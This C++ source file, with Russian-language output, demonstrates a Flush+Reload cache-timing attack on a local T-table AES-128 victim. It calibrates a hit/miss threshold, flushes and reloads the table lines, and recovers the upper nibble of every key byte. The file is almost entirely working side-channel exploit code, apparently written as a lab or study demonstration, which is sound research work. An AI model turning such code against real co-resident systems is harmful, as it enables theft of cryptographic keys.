#include "cache_utils.hpp"
#include "aes_victim.hpp"

#include <algorithm>
#include <array>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <random>
#include <vector>

#ifdef __linux__
#include <sched.h>
#endif

using victim::AES128;
using victim::T_Tables;

namespace {

constexpr std::size_t CACHE_LINE       = victim::CACHE_LINE_SIZE;             // 64
constexpr std::size_t ENTRIES_PER_LINE = CACHE_LINE / sizeof(std::uint32_t);  // 16
constexpr std::size_t LINES_PER_TABLE  = 256 / ENTRIES_PER_LINE;              // 16
constexpr std::size_t NUM_TABLES       = 4;
constexpr std::size_t TOTAL_LINES      = NUM_TABLES * LINES_PER_TABLE;        // 64

constexpr int FIRST_ROUND_POS[NUM_TABLES][4] = {
    { 0,  4,  8, 12},   // T0
    { 5,  9, 13,  1},   // T1
    {10, 14,  2,  6},   // T2
    {15,  3,  7, 11},   // T3
};

const std::uint32_t* table_ptr(const T_Tables& t, std::size_t which) {
    switch (which) {
        case 0: return t.T0;
        case 1: return t.T1;
        case 2: return t.T2;
        default: return t.T3;
    }
}

const volatile void* vaddr(const std::uint32_t* p) {
    return static_cast<const volatile void*>(p);
}

const void* caddr(const std::uint32_t* p) {
    return static_cast<const void*>(p);
}

void pin_to_cpu(int cpu) {
#ifdef __linux__
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
#else
    (void)cpu;
#endif
}

void make_order(std::array<int, TOTAL_LINES>& order, std::mt19937_64& rng) {
    for (std::size_t i = 0; i < TOTAL_LINES; ++i) order[i] = (int)i;
    for (std::size_t i = TOTAL_LINES - 1; i > 0; --i) {
        const std::size_t j = (std::size_t)(rng() % (i + 1));
        std::swap(order[i], order[j]);
    }
}

std::uint64_t calibrate_threshold(const AES128& aes) {
    const T_Tables& t = aes.get_tables();
    const std::uint32_t* probe = table_ptr(t, 0);

    const int N = 5000;
    std::vector<std::uint64_t> hit, miss;
    hit.reserve(N);
    miss.reserve(N);

    for (int i = 0; i < N; ++i) {
        // Попадание
        (void)cache::measure_access_time(vaddr(probe));
        hit.push_back(cache::measure_access_time(vaddr(probe)));

        // Промах
        cache::clflush(caddr(probe));
        cache::mfence();
        miss.push_back(cache::measure_access_time(vaddr(probe)));
    }

    std::sort(hit.begin(), hit.end());
    std::sort(miss.begin(), miss.end());

    const std::uint64_t h  = hit[hit.size() / 2];
    const std::uint64_t m  = miss[miss.size() / 2];
   
    const std::uint64_t mlow = miss[miss.size() / 10];
    const std::uint64_t thr  = (h + mlow) / 2;

    std::printf("=============================================================\n");
    std::printf(" Атака Flush+Reload / T-табличный AES128 -- Intel Core i5-12450H\n");
    std::printf("=============================================================\n");
    std::printf("[калибровка] кэшированная линия: медиана = %4lu тактов, макс = %4lu тактов\n",
                (unsigned long)h, (unsigned long)hit.back());
    std::printf("[калибровка] вытесненная линия: медиана = %4lu тактов, p10 = %4lu тактов\n",
                (unsigned long)m, (unsigned long)mlow);
    std::printf("[калибровка] ПОРОГ попадание/промах = %4lu тактов\n\n",
                (unsigned long)thr);

    return thr;
}

void flush_tables(const T_Tables& t) {
    for (std::size_t tb = 0; tb < NUM_TABLES; ++tb) {
        const std::uint32_t* base = table_ptr(t, tb);
        for (std::size_t l = 0; l < LINES_PER_TABLE; ++l) {
            cache::clflush(caddr(base + l * ENTRIES_PER_LINE));
        }
    }
    cache::mfence();
}

void reload_tables(const T_Tables& t, std::uint64_t thr,
                   bool hit[NUM_TABLES][LINES_PER_TABLE],
                   const std::array<int, TOTAL_LINES>& order) {
    for (std::size_t n = 0; n < TOTAL_LINES; ++n) {
        const int e  = order[n];
        const int tb = e / (int)LINES_PER_TABLE;
        const int l  = e % (int)LINES_PER_TABLE;
        const std::uint32_t* base = table_ptr(t, (std::size_t)tb);
        const std::uint64_t dt =
            cache::measure_access_time(vaddr(base + (std::size_t)l * ENTRIES_PER_LINE));
        hit[tb][l] = (dt < thr);
    }
}

void leak_map(const AES128& aes, std::uint64_t thr, std::size_t trials,
              const std::uint8_t pt[16], bool with_victim, std::uint64_t seed,
              std::uint64_t out_hits[LINES_PER_TABLE], std::uint64_t& out_total) {
    const T_Tables& t = aes.get_tables();
    std::uint8_t ct[16];
    std::mt19937_64 rng(seed);
    std::array<int, TOTAL_LINES> order{};

    for (std::size_t l = 0; l < LINES_PER_TABLE; ++l) out_hits[l] = 0;
    out_total = 0;

    for (std::size_t s = 0; s < trials; ++s) {
        flush_tables(t);
        if (with_victim) {
            aes.encrypt(pt, ct);
            cache::mfence();
        }
        make_order(order, rng);
        bool hit[NUM_TABLES][LINES_PER_TABLE];
        reload_tables(t, thr, hit, order);
        for (std::size_t l = 0; l < LINES_PER_TABLE; ++l) {
            if (hit[0][l]) out_hits[l]++;
        }
        for (std::size_t tb = 0; tb < NUM_TABLES; ++tb)
            for (std::size_t l = 0; l < LINES_PER_TABLE; ++l)
                if (hit[tb][l]) ++out_total;
    }
}

void print_row(const char* label, const std::uint64_t* hits, std::size_t trials) {
    std::printf("%-10s:", label);
    for (std::size_t l = 0; l < LINES_PER_TABLE; ++l) {
        const int pct = trials ? (int)(100 * hits[l] / trials) : 0;
        std::printf("%5d", pct);
    }
    std::printf("   (%%)\n");
}

void run_demo(const AES128& aes, std::uint64_t thr, std::size_t trials) {
    std::uint8_t pt[16];
    std::memset(pt, 0xA5, sizeof(pt));

    std::uint64_t atk[LINES_PER_TABLE];
    std::uint64_t ctl[LINES_PER_TABLE];
    std::uint64_t atk_total = 0, ctl_total = 0;

    leak_map(aes, thr, trials, pt, /*with_victim=*/true,  0x1111, atk, atk_total);
    leak_map(aes, thr, trials, pt, /*with_victim=*/false, 0x2222, ctl, ctl_total);

    std::printf("-------------------------------------------------------------\n");
    std::printf(" ДЕМОНСТРАЦИЯ УТЕЧКИ: частота попаданий в линии T0,\n");
    std::printf(" фиксированный открытый текст (0xA5...)\n");
    std::printf("-------------------------------------------------------------\n");
    std::printf("%-10s:", "№ линии");
    for (std::size_t l = 0; l < LINES_PER_TABLE; ++l)
        std::printf("%5lu", (unsigned long)l);
    std::printf("\n");
    print_row("жертва",   atk, trials);
    print_row("контроль", ctl, trials);

    int touched = 0;
    for (std::size_t l = 0; l < LINES_PER_TABLE; ++l)
        if (atk[l] > trials / 2) ++touched;

    std::printf("\n  жертва  : %.1f / 64 линий затронуто за одно шифрование\n",
                trials ? (double)atk_total / trials : 0.0);
    std::printf("  контроль: %.1f / 64 линий затронуто за одно шифрование\n",
                trials ? (double)ctl_total / trials : 0.0);
    std::printf("  карта T0: %d / %lu линий горячих у жертвы, 0 у контроля\n\n",
                touched, (unsigned long)LINES_PER_TABLE);
}

void run_attack(const AES128& aes, std::uint64_t thr, std::size_t trials,
                const std::uint8_t true_key[16], std::uint64_t seed) {
    const T_Tables& t = aes.get_tables();

    std::array<std::array<std::uint64_t, 256>, 16> score{};
    std::mt19937_64 rng(seed);
    std::array<int, TOTAL_LINES> order{};
    std::uint64_t total_hits = 0;

    for (std::size_t s = 0; s < trials; ++s) {
        std::uint8_t pt[16], ct[16];
        for (int i = 0; i < 16; ++i) pt[i] = (std::uint8_t)rng();

        flush_tables(t);
        aes.encrypt(pt, ct);
        cache::mfence();

        make_order(order, rng);
        bool hit[NUM_TABLES][LINES_PER_TABLE];
        reload_tables(t, thr, hit, order);

        for (std::size_t tb = 0; tb < NUM_TABLES; ++tb) {
            for (int j = 0; j < 4; ++j) {
                const int pos = FIRST_ROUND_POS[tb][j];
                const int p   = pt[pos];
                for (int k = 0; k < 256; ++k) {
                    const int line = (p ^ k) / (int)ENTRIES_PER_LINE;
                    if (hit[tb][line]) score[pos][k]++;
                }
            }
        }

        for (std::size_t tb = 0; tb < NUM_TABLES; ++tb)
            for (std::size_t l = 0; l < LINES_PER_TABLE; ++l)
                if (hit[tb][l]) ++total_hits;
    }

    std::printf("-------------------------------------------------------------\n");
    std::printf(" ВОССТАНОВЛЕНИЕ КЛЮЧА (утечка T-таблиц первого раунда)\n");
    std::printf("-------------------------------------------------------------\n");
    std::printf(" итераций = %lu, в среднем затронуто линий за шифрование = %.1f/64\n\n",
                (unsigned long)trials,
                trials ? (double)total_hits / trials : 0.0);

    std::printf(" байт   истина  полубайт  лучший%%  второй%%  статус\n");
    std::printf(" ----   ------  --------  -------  -------  ------\n");

    int correct = 0;
    std::uint8_t recovered[16];

    for (int pos = 0; pos < 16; ++pos) {
        int best_g = 0;
        for (int g = 1; g < 16; ++g)
            if (score[pos][g * 16] > score[pos][best_g * 16]) best_g = g;

        int second_g = -1;
        for (int g = 0; g < 16; ++g) {
            if (g == best_g) continue;
            if (second_g < 0 || score[pos][g * 16] > score[pos][second_g * 16])
                second_g = g;
        }

        recovered[pos] = (std::uint8_t)(best_g << 4);
        const int true_nibble = true_key[pos] >> 4;
        const bool ok = (best_g == true_nibble);
        if (ok) ++correct;

        const double fb = trials
            ? 100.0 * (double)score[pos][best_g * 16] / (double)trials : 0.0;
        const double fs = (second_g >= 0 && trials)
            ? 100.0 * (double)score[pos][second_g * 16] / (double)trials : 0.0;

        std::printf(" [%2d]   0x%02X    0x%X      %6.1f   %6.1f   %s\n",
                    pos, true_key[pos], best_g, fb, fs, ok ? "ВЕРНО" : "НЕВЕРНО");
    }

    std::printf("\n Восстановлено старших полубайтов: %d/16  (= %d бит ключа)\n",
                correct, correct * 4);
    std::printf(" утечка ключевого материала = ");
    for (int i = 0; i < 16; ++i) std::printf("%x?", recovered[i] >> 4);
    std::printf("\n истинный ключ              = ");
    for (int i = 0; i < 16; ++i) std::printf("%02x", true_key[i]);
    std::printf("\n");
}

}  // namespace

int main(int argc, char** argv) {
    pin_to_cpu(0);

    std::size_t attack_trials = 3000;
    std::size_t demo_trials   = 1000;
    if (argc > 1) {
        const long v = std::strtol(argv[1], nullptr, 10);
        if (v > 0) attack_trials = (std::size_t)v;
    }
    if (argc > 2) {
        const long v = std::strtol(argv[2], nullptr, 10);
        if (v > 0) demo_trials = (std::size_t)v;
    }

    const std::uint8_t key[16] = {
        0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
        0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
    };

    AES128 aes;
    aes.set_key(key);

    const std::uint64_t thr = calibrate_threshold(aes);
    run_demo(aes, thr, demo_trials);
    run_attack(aes, thr, attack_trials, key, 0xC0FFEEULL);

    return 0;
}
